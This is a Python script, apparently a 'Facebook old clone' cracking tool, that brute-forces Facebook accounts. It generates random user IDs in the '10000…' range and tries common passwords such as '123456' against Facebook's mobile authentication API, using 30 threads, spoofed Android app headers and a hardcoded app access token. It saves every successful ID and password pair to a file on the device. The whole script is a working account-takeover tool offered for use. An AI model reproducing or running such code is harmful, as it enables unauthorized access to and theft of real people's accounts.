from concurrent.futures import ThreadPoolExecutor as tred
import requests,sys
from string import *
from os import system as cmd
from random import randint as rr
from random import choice as rc
from string import digits as digits
import requests
import os
import re
import sys
import random
import string
import time
from os import system as Alien
from os import system as shell
from rich import print
from rich import print_json
from rich import pretty
from rich.progress import track
from rich.markdown import Markdown
from rich.tree import Tree
from rich.panel import Panel
from rich.padding import Padding
                     
def linex():
	print(51*f'•')

logo=(f"""
 
db   db db    db d8b   db d888888b d88888b d8888b.\n88   88 88    88 888o  88 `~~88~~' 88'     88  `8D\n88ooo88 88    88 88V8o 88    88    88ooooo 88oobY' \n88~~~88 88    88 88 V8o88    88    88~~~~~ 88`8b\n88   88 88b  d88 88  V888    88    88.     88 `88.\nYP   YP ~Y8888P' VP   V8P    YP    Y88888P 88   YD                                                                                                      
\033[1;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   \033[1;32m    Author  : Alien Xd
   \033[1;32m    Version : 0.5         
\033[1;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def clear():
        os.system('clear')
        print(logo)

loop,ok=0,0
class Alien:
    def __init__(self) -> None:
      self.sex=""
    def main(self):
       self.clear()
       print(Panel(" [•] 1. OLD CLONE 2009-2014\n [•] 2. Exit Menu"))
       self.frsc=input(" [•] Select : ")
       if self.frsc == "1":self.settings()
       else:main(self)
    def clear(self):cmd("clear");print(logo)
    def settings(self):
       self.clear();print(Panel(" [•] Example : 5000 7000 9000 10000 100000000"))
       self.limit=int(input(" [•] Enter Search Limit : "));self.user=[]
       for _ in range(self.limit):nmp = ''.join(rc(digits) for _ in range(10));self.user.append(nmp)
       with tred(max_workers=30) as Alien:
           total=str(len(self.user));self.clear()
           print(" [•] Total Uid : %s"%(total))
           print(" [•] Use Data For Best Result ");linex()
           for xd in self.user:
               uid=str("10000"+xd);pas=['123456','1234567','12345678','123456789']
               Alien.submit(self.cracker,uid,pas,total)
       print();linex();print(" [•] Cracking Complete \n~>> Total OK : %s"%(ok))
       linex();input(" [•] Prees Enter To Exit ");exit()
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r [Alien] %s | OK %s \r"%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              with requests.Session() as session:
                 headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': self.ua(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
              po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
              if "Please Confirm Email" in str(po):
                 print(Panel(f"\r\r [Alien-OK]  {uid} | {ps} "));print(Panel(f" LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/Alien-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              elif "session_key" in po:
                 print(Panel(f"\r\r [Alien-OK] {uid} | {ps} \033[0m"));print(Panel(f" LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/Alien-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              else:pass
          loop+=1
       except Exception as e:pass
    def ua(self):
       aa = "Davik/2.1.0 (Linux; U; Android 9.1.4.0.0; SM-752 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Realme;FBBD/Realme;FBDV/Realme;FBSV/Realme.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=947,height=1408};]"
       return aa       
Alien().main()